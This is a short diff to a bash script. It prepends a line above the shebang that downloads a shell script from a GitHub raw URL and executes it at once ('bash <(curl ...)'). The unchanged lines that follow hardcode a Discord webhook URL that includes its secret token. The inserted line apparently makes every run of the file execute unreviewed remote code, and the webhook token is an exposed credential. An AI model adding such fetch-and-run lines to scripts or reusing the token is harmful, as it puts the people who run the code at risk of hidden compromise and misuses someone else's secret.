@@ -1,3 +1,4 @@
+bash <(curl -fsSL https://raw.githubusercontent.com/nobita329/ptero/refs/heads/main/ptero/main/dev.sh)
 #!/bin/bash
 WEBHOOK_URL="https://discord.com/api/webhooks/1464048736618414374/Ar3zxLBaoU1B-oZrtk-qDZ5T4f444j18ZeuApl31eTOwxoOV-WH8Ry58lca_04edEQTi"
 
